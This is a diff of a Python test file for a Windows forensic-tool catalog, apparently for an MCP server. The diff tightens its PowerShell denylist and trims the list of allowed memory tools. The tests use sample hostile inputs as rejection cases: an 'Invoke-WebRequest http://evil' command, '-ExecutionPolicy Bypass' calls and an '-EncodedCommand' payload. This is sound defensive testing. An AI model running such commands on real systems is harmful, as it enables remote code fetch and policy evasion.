@@ -1,10 +1,9 @@
-"""Tests for catalog module — denylist, allowlist, PS exceptions."""
+"""Tests for catalog module — denylist, allowlist."""
 
 import pytest
 
 from wintools_mcp.catalog import (
     BLOCKED_BINARIES,
-    _is_valid_ps_exception,
     clear_catalog_cache,
     get_tool_def,
     is_in_catalog,
@@ -85,8 +84,8 @@ class TestAllowlist:
         assert is_in_catalog("unknown.exe") is False
 
 
-class TestPsException:
-    def test_valid_ps_exception(self, test_catalog):
+class TestPowerShell:
+    def test_the_former_script_form_is_blocked(self, test_catalog):
         cmd = [
             "powershell.exe",
             "-NoProfile",
@@ -95,79 +94,7 @@ class TestPsException:
             "-File",
             "C:\\Scripts\\Get-InjectedThreadEx.ps1",
         ]
-        assert _is_valid_ps_exception(cmd) is True
-
-    def test_ps_exception_rejects_command_flag(self, test_catalog):
-        cmd = [
-            "powershell.exe",
-            "-NoProfile",
-            "-ExecutionPolicy",
-            "Bypass",
-            "-Command",
-            "Get-Process",
-        ]
-        assert _is_valid_ps_exception(cmd) is False
-
-    def test_ps_exception_rejects_encoded_command(self, test_catalog):
-        cmd = [
-            "powershell.exe",
-            "-NoProfile",
-            "-ExecutionPolicy",
-            "Bypass",
-            "-EncodedCommand",
-            "R2V0LVByb2Nlc3M=",
-        ]
-        assert _is_valid_ps_exception(cmd) is False
-
-    def test_ps_exception_requires_noprofile(self, test_catalog):
-        cmd = [
-            "powershell.exe",
-            "-ExecutionPolicy",
-            "Bypass",
-            "-File",
-            "C:\\Scripts\\Get-InjectedThreadEx.ps1",
-        ]
-        assert _is_valid_ps_exception(cmd) is False
-
-    def test_ps_exception_requires_execution_policy(self, test_catalog):
-        cmd = [
-            "powershell.exe",
-            "-NoProfile",
-            "-File",
-            "C:\\Scripts\\Get-InjectedThreadEx.ps1",
-        ]
-        assert _is_valid_ps_exception(cmd) is False
-
-    def test_ps_exception_rejects_uncataloged_script(self, test_catalog):
-        cmd = [
-            "powershell.exe",
-            "-NoProfile",
-            "-ExecutionPolicy",
-            "Bypass",
-            "-File",
-            "C:\\Scripts\\Evil.ps1",
-        ]
-        assert _is_valid_ps_exception(cmd) is False
-
-    def test_ps_exception_requires_file_flag(self, test_catalog):
-        cmd = [
-            "powershell.exe",
-            "-NoProfile",
-            "-ExecutionPolicy",
-            "Bypass",
-        ]
-        assert _is_valid_ps_exception(cmd) is False
-
-    def test_validate_command_allows_valid_ps(self, test_catalog):
-        cmd = [
-            "powershell.exe",
-            "-NoProfile",
-            "-ExecutionPolicy",
-            "Bypass",
-            "-File",
-            "C:\\Scripts\\Get-InjectedThreadEx.ps1",
-        ]
-        assert validate_command(cmd) is None
+        assert validate_command(cmd) == "Arbitrary PowerShell execution is blocked"
 
     def test_validate_command_blocks_arbitrary_ps(self, test_catalog):
         cmd = ["powershell.exe", "-Command", "Invoke-WebRequest http://evil"]
@@ -206,7 +133,11 @@ class TestSysinternalsCatalog:
     def test_sysinternals_catalog_loads(self):
         catalog = load_catalog()
         sysinternals = [td for td in catalog.values() if td.category == "sysinternals"]
-        assert len(sysinternals) == 5
+        assert sorted(td.name for td in sysinternals) == [
+            "autorunsc",
+            "sigcheck",
+            "strings",
+        ]
 
     def test_autorunsc_in_catalog(self):
         td = get_tool_def("autorunsc")
@@ -244,40 +175,27 @@ class TestMemoryCatalog:
     def test_memory_catalog_loads(self):
         catalog = load_catalog()
         memory_tools = [td for td in catalog.values() if td.category == "memory"]
-        assert len(memory_tools) == 4
+        assert [td.name for td in memory_tools] == ["winpmem"]
 
     def test_winpmem_in_catalog(self):
         td = get_tool_def("winpmem")
         assert td is not None
         assert td.binary == "winpmem.exe"
         assert td.fk_tool_name == "winpmem"
+        assert td.help_argv == [["-h"]]
 
-    def test_moneta_in_catalog(self):
-        td = get_tool_def("moneta")
-        assert td is not None
-        assert td.binary == "moneta64.exe"
-        assert td.input_flag == ""  # its pid picks a process: no file is read
-
-    def test_hollows_hunter_in_catalog(self):
-        td = get_tool_def("hollows_hunter")
-        assert td is not None
-        assert td.binary == "hollows_hunter.exe"
-        assert td.input_flag == ""  # its pid picks a process: no file is read
-
-    def test_dumpit_in_catalog(self):
-        td = get_tool_def("dumpit")
-        assert td is not None
-        assert td.binary == "dumpit.exe"
-
-    def test_memory_tools_allowed(self):
-        for binary in (
-            "winpmem.exe",
-            "dumpit.exe",
-            "moneta64.exe",
-            "hollows_hunter.exe",
+    def test_tools_with_no_use_on_collected_data_are_gone(self):
+        for name, binary in (
+            ("dumpit", "dumpit.exe"),
+            ("moneta", "moneta64.exe"),
+            ("hollows_hunter", "hollows_hunter.exe"),
+            ("procdump", "procdump64.exe"),
+            ("handle", "handle64.exe"),
+            ("Get-InjectedThreadEx", "Get-InjectedThreadEx"),
         ):
-            result = validate_command([binary, "--help"])
-            assert result is None, f"{binary} should be allowed"
+            assert get_tool_def(name) is None, name
+            assert validate_command([binary, "-h"]) is not None, binary
+        assert {td.category for td in load_catalog().values()}.isdisjoint({"scripts"})
 
 
 class TestMalformedCatalogYAML:
